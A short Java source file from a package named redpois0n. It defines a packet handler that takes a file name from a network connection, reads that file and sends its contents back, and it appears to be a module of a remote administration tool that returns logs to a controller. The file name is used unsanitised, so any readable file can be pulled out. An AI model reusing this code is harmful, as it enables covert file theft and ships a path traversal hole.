package com.redpois0n.packets.incoming;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;

import com.redpois0n.Connection;
import com.redpois0n.utils.Utils;


public class PacketLOG extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String what = Connection.readLine();
		File file = new File(Utils.getPath().getAbsolutePath() + File.separator + what);
		FileInputStream in = new FileInputStream(file);
		BufferedReader reader = new BufferedReader(new InputStreamReader(in));
		String log = "";
		
		String line;
		
		while ((line = reader.readLine()) != null) {
			log += line + "\n";
		}
		reader.close();
		Connection.writeLine("LOG");
		Connection.writeLine(what);
		Connection.writeLine(log);
	}

}
